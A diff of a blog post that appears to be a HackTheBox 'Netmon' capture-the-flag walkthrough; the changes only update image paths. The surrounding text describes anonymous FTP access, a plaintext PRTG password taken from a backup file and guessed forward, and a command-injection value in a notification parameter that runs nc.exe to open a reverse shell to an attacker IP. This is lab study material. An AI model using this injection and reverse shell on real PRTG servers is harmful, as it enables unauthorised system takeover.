@@ -115,13 +115,13 @@ Since anonymous FTP login is allowed, let's go with that first.
 To my pleasant surprise, `C:\Users\Public` is available.
 
 <a class="image-popup">
-![2f8bf31c.png](:storage/13c45494-6a27-4d68-ad5f-496d8c8fb907/2f8bf31c.png)
+![2f8bf31c.png](/assets/images/posts/netmon-htb-walkthrough/2f8bf31c.png)
 </a>
 
 And guess what, `user.txt` is here!
 
 <a class="image-popup">
-![90a90b90.png](:storage/13c45494-6a27-4d68-ad5f-496d8c8fb907/90a90b90.png)
+![90a90b90.png](/assets/images/posts/netmon-htb-walkthrough/90a90b90.png)
 </a>
 
 ### PRTG Network Monitor
@@ -129,25 +129,25 @@ And guess what, `user.txt` is here!
 Moving on to the `http` service, this is how it looks like.
 
 <a class="image-popup">
-![542fe300.png](:storage/13c45494-6a27-4d68-ad5f-496d8c8fb907/542fe300.png)
+![542fe300.png](/assets/images/posts/netmon-htb-walkthrough/542fe300.png)
 </a>
 
 In conjuntion with the official security [advisory](https://www.paessler.com/about-prtg-17-4-35-through-18-1-37) and the [location](https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data) of the various configuration files, I was able to uncover a plaintext password from the file below.
 
 <a class="image-popup">
-![adca4be4.png](:storage/13c45494-6a27-4d68-ad5f-496d8c8fb907/adca4be4.png)
+![adca4be4.png](/assets/images/posts/netmon-htb-walkthrough/adca4be4.png)
 </a>
 
 Here's the plaintext password.
 
 <a class="image-popup">
-![56c19c7a.png](:storage/13c45494-6a27-4d68-ad5f-496d8c8fb907/56c19c7a.png)
+![56c19c7a.png](/assets/images/posts/netmon-htb-walkthrough/56c19c7a.png)
 </a>
 
 And since this is a backup and knowing many administrators increment the year for convenience's sake, the password may be `PrTg@dmin2019`. Let's give it a shot.
 
 <a class="image-popup">
-![3214f2a7.png](:storage/13c45494-6a27-4d68-ad5f-496d8c8fb907/3214f2a7.png)
+![3214f2a7.png](/assets/images/posts/netmon-htb-walkthrough/3214f2a7.png)
 </a>
 
 Awesome.
@@ -167,7 +167,7 @@ If you've read the blog carefully, you'll realize certain characters are encoded
 Verify that `nc.exe` is indeed downloaded.
 
 <a class="image-popup">
-![e26dd675.png](:storage/13c45494-6a27-4d68-ad5f-496d8c8fb907/e26dd675.png)
+![e26dd675.png](/assets/images/posts/netmon-htb-walkthrough/e26dd675.png)
 </a>
 
 Next, we use the following parameters to run a reverse shell back to us.
@@ -177,13 +177,13 @@ test.txt; c:\Users\Public\Downloads\nc.exe 10.10.15.200 1234 -e cmd.exe
 ```
 
 <a class="image-popup">
-![4b13a195.png](:storage/13c45494-6a27-4d68-ad5f-496d8c8fb907/4b13a195.png)
+![4b13a195.png](/assets/images/posts/netmon-htb-walkthrough/4b13a195.png)
 </a>
 
 Getting `root.txt` is trivial when you have `SYSTEM` privileges.
 
 <a class="image-popup">
-![4d1f295b.png](:storage/13c45494-6a27-4d68-ad5f-496d8c8fb907/4d1f295b.png)
+![4d1f295b.png](/assets/images/posts/netmon-htb-walkthrough/4d1f295b.png)
 </a>
 
 :dancer:
